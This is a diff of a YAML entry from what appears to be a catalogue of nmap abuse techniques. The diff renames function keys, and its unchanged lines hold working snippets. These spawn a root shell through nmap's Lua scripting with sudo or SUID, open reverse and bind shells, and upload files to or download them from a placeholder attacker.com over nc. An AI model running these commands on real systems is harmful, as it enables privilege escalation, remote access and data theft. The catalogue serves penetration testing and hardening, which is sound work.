@@ -1,12 +1,12 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - description: Input echo is disabled.
       code: |
         TF=$(mktemp)
         echo 'os.execute("/bin/sh")' > $TF
         nmap --script=$TF
-  reverse-shell-non-interactive:
+  non-interactive-reverse-shell:
     - description: Run ``nc -l -p 12345`` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
@@ -21,7 +21,7 @@ functions:
           end;
           f:close();t:close();' > $TF
         nmap --script=$TF
-  bind-shell-non-interactive:
+  non-interactive-bind-shell:
     - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
       code: |
         export LPORT=12345
@@ -34,7 +34,7 @@ functions:
             local b=assert(f:read("*a"));c:send(b);
           end;c:close();f:close();' > $TF
         nmap --script=$TF
-  upload:
+  file-upload:
     - description: Send a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
       code: |
         export RHOST=attacker.com
@@ -50,7 +50,7 @@ functions:
           t:send(d);
           t:close();' > $TF
         nmap --script=$TF
-  download:
+  file-download:
     - description: Fetch remote file sent to a local TCP port. Run `nc target.com 12345
         < "file_to_send"` on the attacker box to send the file.
       code: |
@@ -76,13 +76,13 @@ functions:
         TF=$(mktemp)
         echo 'lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
         nmap --script=$TF
-  sudo-enabled:
+  sudo:
     - description: Input echo is disabled.
       code: |
         TF=$(mktemp)
         echo 'os.execute("/bin/sh")' > $TF
         sudo nmap --script=$TF
-  suid-limited:
+  limited-suid:
     - description: Input echo is disabled.
       code: |
         TF=$(mktemp)
